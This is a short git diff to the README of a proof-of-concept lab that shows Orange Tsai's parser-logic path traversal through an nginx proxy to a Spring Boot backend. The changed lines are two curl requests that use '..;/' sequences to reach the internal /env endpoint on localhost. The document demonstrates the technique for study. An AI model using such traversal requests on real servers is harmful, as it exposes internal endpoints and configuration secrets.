@@ -16,8 +16,8 @@ This is a PoC that combines Orange Tsais research about ["Breaking parser logic"
 	}
 ```
 6. start nginx
-7. curl localhost:8081/orange/..;/env
-8. curl localhost:8081/orange/directory/..;/..;/env
+7. `curl localhost:8081/orange/..;/env`
+8. `curl localhost:8081/orange/directory/..;/..;/env`
 
 Nginx will send the request to the spring boot application at `http://localhost:8080/api/directory/..;/..;/env`
 The path traversal makes that a request to `http://localhost:8080/env`
